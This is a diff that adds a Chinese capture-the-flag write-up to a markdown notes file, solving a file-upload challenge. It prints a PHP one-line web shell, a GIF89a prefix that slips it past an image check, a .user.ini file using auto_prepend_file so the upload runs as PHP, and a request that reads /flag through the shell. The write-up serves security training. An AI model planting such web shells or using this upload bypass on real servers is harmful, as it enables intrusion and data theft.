@@ -1420,6 +1420,95 @@ echo $baimao;
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134648981?spm=1001.2014.3001.5501
 
+## BUUCTF [SUCTF 2019]CheckIn 1（user.ini文件构成的PHP后门  |  两种解法！）
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701153364874-e26fa29c-1f1d-45e3-a90f-21971d2d8200.png#averageHue=%23faf9f8&clientId=uad7efa9f-934d-4&from=paste&height=200&id=u4765d7f5&originHeight=250&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37561&status=done&style=none&taskId=u9b3d8909-a262-44d5-9162-9c5055ce03c&title=&width=1528.8)
+> 可以看出是文件上传类的题目
+> 绕过后缀的文件格式有php、php3、php4、php5、phtml、pht。
+
+构造木马文件<br />`<?php @eval($_REQUEST['shell']); ?>`
+> 这里我把文件命名为了shell.php
+
+上传木马文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701155311263-bc66926e-f036-4ff8-ab6e-b06bc0470f31.png#averageHue=%23faf9f8&clientId=uad7efa9f-934d-4&from=paste&height=210&id=u452f5ef8&originHeight=263&originWidth=1648&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39509&status=done&style=none&taskId=ucaaf6d43-299b-452d-9d62-a1e29797bd7&title=&width=1318.4)
+> illegal suffix!
+> 非法后缀
+
+> 将shell.php改为shell.jpg
+
+继续上传木马文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701155877155-b0e69f21-dae1-450a-a5e2-638efe4db1d8.png#averageHue=%23f9f8f7&clientId=uad7efa9f-934d-4&from=paste&height=209&id=u72be7dca&originHeight=261&originWidth=1585&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38166&status=done&style=none&taskId=u13af36a5-1fb5-46e2-9b6a-67821cc8d4e&title=&width=1268)
+> <? in contents!
+> 存在违法内容"<?"
+
+> 改变思路点
+> 将PHP一句话木马转换为JS形式
+
+重构木马文件<br />`<script language="php">@eval($_REQUEST['shell']);</script>`<br />继续上传<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701156570359-f38ae828-9dca-4542-8928-38f852de87fa.png#averageHue=%23faf9f9&clientId=uad7efa9f-934d-4&from=paste&height=247&id=u6baf9511&originHeight=309&originWidth=1654&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41573&status=done&style=none&taskId=u5bb2bfcf-d80d-4de8-83ca-37e1eca31a1&title=&width=1323.2)
+> exif_imagetype:not image!
+> Exif _ imagetype: 不是 image!
+
+> Exif _ imagetype无法检测GIF动态图片
+> GIF的ASCII值是GIF89a
+> 木马前面加GIF89a来绕过Exif _ imagetype的检测
+
+重构<br />`GIF89a<script language="php">@eval($_REQUEST['shell']);</script>`<br />上传<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701157320001-51d1e338-382f-4cab-929e-2570d1e6b31b.png#averageHue=%23f9f7f6&clientId=uad7efa9f-934d-4&from=paste&height=285&id=u8871096b&originHeight=356&originWidth=1395&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46655&status=done&style=none&taskId=u0d741472-654e-45d2-a17d-ddc4a78be55&title=&width=1116)
+> 上传成功
+
+使用中国蚁剑测试连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701157621547-24b0980c-2427-467f-99d5-7a3e5746b038.png#averageHue=%23eeece8&clientId=uad7efa9f-934d-4&from=paste&height=642&id=u58a394ab&originHeight=803&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66765&status=done&style=none&taskId=u369b34e9-be8c-4359-a618-067a0c866bc&title=&width=1026.4)
+> 可以连接，但是返回数据是空的
+> 猜测后台并没有解析PHP代码
+
+访问题目源码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701157706255-fd7114ef-b4f9-4acf-a4ea-749128ca2c5d.png#averageHue=%23fdfdfc&clientId=uad7efa9f-934d-4&from=paste&height=610&id=u87470ce3&originHeight=762&originWidth=637&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61686&status=done&style=none&taskId=u42ea68c4-b543-4de5-bfd0-72eade373fe&title=&width=509.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701157785884-0e163f45-ca3b-4e16-af26-08fc061a737e.png#averageHue=%23e9c78e&clientId=uad7efa9f-934d-4&from=paste&height=637&id=u79738908&originHeight=796&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105063&status=done&style=none&taskId=ud2ede96e-cabc-42d6-b4a3-47e88f957b4&title=&width=1531.2)
+> 提示是.user.ini配置文件
+
+> 这里呢，我发现.user.ini配置文件与.htaccess配置文件比较类似
+> 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+> 注意这几个字“改变文件扩展名”。
+> 
+> .htaccess配置文件格式
+> <FileMatch "1.jpg>
+> SetHandler application/x-httpd-php
+> </FileMatch>
+> 
+> 那么我这里就觉得或者说是简单理解吧
+> .user.ini配置文件和.htaccess配置文件都是为了解析PHP代码
+
+> php.ini大家都熟悉，那么我们就可以把.user.ini理解为用户可自定义的php.ini配置文件
+
+> 官方给的解释
+> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701171357250-4da9c100-bda8-4364-bc54-a8777db8f144.png#averageHue=%23efeeed&clientId=ub4b7fa9e-2ccf-4&from=paste&height=572&id=u6f01eaf4&originHeight=715&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94672&status=done&style=none&taskId=uc8340007-cdd9-4476-8ad0-3e1a778c343&title=&width=1076)
+
+> 两个比较有意思的东西
+> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701171479514-4128c6be-1089-4da2-a57f-8d73c12631df.png#averageHue=%23ededec&clientId=ub4b7fa9e-2ccf-4&from=paste&height=322&id=ua0e07bc8&originHeight=403&originWidth=1341&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51393&status=done&style=none&taskId=u6b639b63-2fd9-4f53-8797-9ae2e4b956f&title=&width=1072.8)
+
+> 而这两个就是.user.ini中的两个配置项
+> auto_prepend_file是在文件前插入
+> auto_append_file是在文件最后才插入
+
+创建.user.ini文件
+> GIF89a
+> auto_prepend_file=shell.jpg
+
+上传.user.ini文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701172018574-e1ee7e0c-d43f-42d7-85da-22d01897f257.png#averageHue=%23f9f8f7&clientId=ub4b7fa9e-2ccf-4&from=paste&height=261&id=u4298332b&originHeight=326&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49957&status=done&style=none&taskId=u21d58acb-bff8-49c9-9fcc-5ef57dc8d0f&title=&width=1531.2)<br />访问路径文件<br />`[http://ac513c0d-afdf-4e89-920a-93eedd63102d.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php](http://ac513c0d-afdf-4e89-920a-93eedd63102d.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php)`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701172090157-a6f39fe0-199f-4bd4-9ff8-54d82eaa27b2.png#averageHue=%23f7f6f5&clientId=ub4b7fa9e-2ccf-4&from=paste&height=109&id=ufda6d3eb&originHeight=136&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29374&status=done&style=none&taskId=uadae8377-6090-4448-8dd8-61b4909816b&title=&width=1533.6)
+> 回显GIF89a就代表解析成功了
+> 这里解释一下为什么index.php主文件在最后面
+> 因为我们使用的是auto_prepend_file，在主文件之前就已经自动解析文件名了，所以index.php主文件在最后面。
+
+**第一种解法：PHP内部命令**
+> **var_dump()** 函数用于输出变量的相关信息。
+> file_get_contents() 函数把整个文件读入一个字符串中。
+
+构造payload<br />`[http://19ff03ff-93cb-4b33-94ec-95a79619b92a.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php](http://19ff03ff-93cb-4b33-94ec-95a79619b92a.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php)?shell=var_dump(file_get_contents("/flag"));`<br />上传payload<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701173394952-a9ad62e7-006a-4983-b975-1804487ec3c4.png#averageHue=%23f7f6f4&clientId=ub4b7fa9e-2ccf-4&from=paste&height=124&id=ue77f9283&originHeight=155&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35953&status=done&style=none&taskId=u7288ea88-f4f3-4801-98e5-e0ac5f0bf85&title=&width=1533.6)<br />得到flag<br />`flag{4f105e98-c110-4b71-9160-545aa8e7131e}`<br />**第二种解法：中国蚁剑**<br />`http://2d9647e6-425e-4d7f-bb6a-116f0f51bfc8.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php`
+> 注：中国蚁剑连接密码就是PHP一句话木马里面的参数
+> 我这里是shell
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701174239422-745899c1-9e76-4b83-a55c-7b724142e300.png#averageHue=%23f9f9f9&clientId=ub4b7fa9e-2ccf-4&from=paste&height=693&id=u880f3e29&originHeight=866&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38771&status=done&style=none&taskId=u7d41cd3b-387c-4c9e-9546-07a5ba7339d&title=&width=1027.2)<br />**得到flag：**<br />`flag{8f943f63-53c9-4395-9f91-d28052e52d55}`
+> 这两种方法测试完，我发现，上传木马后有时间限制，过一段时间木马就会失效，还有试过一种方法，再试另一种方法木马也会失效；只需要重新开启题目环境即可，最后，做这道题的步骤是，先上传.user.ini配置文件，再去上传PHP一句话木马文件。
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134676460?spm=1001.2014.3001.5501
+
+
+
+
 
 
 
